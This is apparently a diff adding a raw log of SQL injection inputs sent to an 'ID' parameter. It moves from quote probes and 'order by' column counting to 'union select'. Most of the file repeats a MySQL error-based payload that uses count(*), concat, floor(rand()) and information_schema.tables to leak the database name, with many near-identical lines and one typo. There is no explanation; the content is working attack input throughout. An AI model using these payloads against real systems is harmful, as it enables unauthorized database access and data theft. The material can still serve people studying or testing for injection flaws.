@@ -1,0 +1,110 @@
+ID:1
+ID:2
+ID:2'
+ID:2\
+ID:2' order by 2332--
+ID:2' order by 1--
+ID:2' order by 1-- 
+ID:2' order by 5-- 
+ID:2' order by 3-- 
+ID:2' union select 1,2,3-- 
+ID:-2' union select 1,2,3-- 
+ID:-2' union select 1111111111,2222222222,333333-- 
+ID:-2'
+ID:-2' -- 
+ID:-2' and 1-- 
+ID:2' and 1-- 
+ID:2' and 0 -- 
+ID:2' and 0-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(selct database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)-- 
+ID:2' and select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and 0-- 
+ID:2' and 1-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*2)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*0)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*10000)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*100)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*100)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*100)) a from information_schema.tables group by a)b)-- 
+ID:2' and (select 1 from (select count(*), concat(0x3a3a,(select database()),0x3a3a,floor(rand()*100)) a from information_schema.tables group by a)b)-- 
